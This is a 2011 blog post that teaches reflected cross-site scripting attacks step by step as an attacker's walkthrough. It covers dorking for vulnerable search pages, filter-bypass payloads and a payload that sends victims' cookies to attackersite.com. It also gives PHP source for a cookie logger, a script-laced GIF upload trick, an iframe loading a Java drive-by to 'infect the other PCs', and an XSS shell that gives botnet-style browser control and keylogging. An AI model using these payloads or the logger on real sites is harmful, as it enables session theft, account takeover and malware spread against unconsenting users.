---
id: 1795
title: 'History of hack: Cross Site Scripting (XSS)'
date: 2011-12-07T08:30:46+01:00
author: ax
excerpt: |
  <p>History di esempio di un attacco "Cross Site Scripting (XSS)" by Razor4x</p>
layout: post
guid: http://linuax.altervista.org/blog/?p=1795
permalink: /2011/12/07/history-of-hack-cross-site-scripting-xss/
categories:
  - Hacking
  - History
  - xss
tags:
  - cross site scripting
  - history
  - xss
---
## Cross Site Scrpting History (XSS):

Searching for vulnerable sites dorking with google...

<pre>inurl:"*.php?search="</pre>

Open one of this and test if is vulnerable...

<pre>cerca.php?search=&lt;script&gt;alert("XSS found");&lt;/script&gt;</pre>

This little code will make, if the site doesn't put some filters in the search GET variable, a pop-up ... If it doesn't ? Let's check out if this is a syntax mistake or a filter like htmlspecialchars block us  
Open html sources in your browser windows and press ctrl+u. Find a pattern like "XSS found" in this case for discover immediatly the offset of the alert. If in our exploit chars like "<"."(" and other special chars are been replaced such as > that's means the  variable are filtered by htmlspecialchars function provided by PHP.

<pre>&lt;!-- extract of html source code --&gt;
 &lt;input name="pad" value="&lt;script&gt;alert("XSS Found");&lt;/script&gt;"&gt;
&lt;!-- end of extract of html source code --&gt;</pre>

This is an example of syntax mistake. For bypass this just use this syntax.

<pre>cerca.php?search="&gt;&lt;script&gt;alert("XSS found");&lt;/script&gt;</pre>

Here we are our alert :)  
In a certain site the "" are disable. What I can do now? Just type this for an example:

<pre>cerca.php?search=&lt;script&gt;alert(String.fromCharCode(88, 83, 83, 32, 70, 111, 117, 110, 100))&lt;/script&gt;</pre>

And pop-up come's out!  
Set up a cookie logger.

<pre>cerca.php?search=&lt;script&gt;window.location="http://attackersite.com/cookiestealer.php?cookies="+document.cookie;&lt;/script&gt;</pre>

Now we need to give this peace of script to our victim. If he/she will run this exploit on our host we'll have ALL the cookies that the victim has on that site that we exploit. For the source code of the cookie logger look at the EOF. Source of Cookie stealer:

<pre> &lt;?php
    $contenuto="cookie=".$_GET['cookies'];
    $fp=fopen('./cookies.txt', 'a');
    fwrite($fp, $contenuto."\n");
    fclose($fp);
?&gt;</pre>

Create a file called cookies.txt on your host and than for stealing cookie just use the URL:

http://yousite.com/cookiesteal.php?cookies=

### ~ Other stuff for XSSing...

Create a GIF file and put open it with a text editor. Now delete all the content and write this:

<pre>GIF89a&lt;script&gt;alert("XSS Upload :]");</pre>

Upload on your host and go thourght it and... the alert come's out (may don't work with certain browser, try it all..). This will work with JPG,BMP and all other formats with the condition to put at the start of the file the identification of the image type (JPG is JFIF for example just googling...).  
XSS worm is other good stuff that can be performed with XSS by using Java Drive By.

<pre>cerca.php?search=&lt;iframe src="http://yourwebsite.com/javadrivebylink.js"&gt;&lt;/iframe&gt;</pre>

Spread around to infect the other PCs. XSS Tunelling is another good tecniques that can be performed by an XSS vulnerability by give to the slave the following script

<pre>cerca.php?search=&lt;script src="http://serversite.com/xsshell.asp"&gt;&lt;/script&gt;</pre>

But first you need to configure your server-side xss shell and start the xss tunnel. With this you can control the browser victim, send commands, setup a javascript keylogger and a lot of other stuff. It will become a sort of XSS Botnet. Two words about its operation. In this tecniques there are three components: the attacker, the victim and the server. The server can be provided by a free hosting but the thing that is important is that this site must be an IIS 5 or higer because the xss shell is written in asp. So when you have prepared the xss and gave to your victim, if is persistent or not is not much important, the xss shell in the victim's browser will established a connection with the server and wait for commands that it will execute. The commands are provided by us throught XSS Tunnel that send at the server that send at the victim. All this inside in a XSS channel built when victim run our malicious code.

\# End (Razor4x)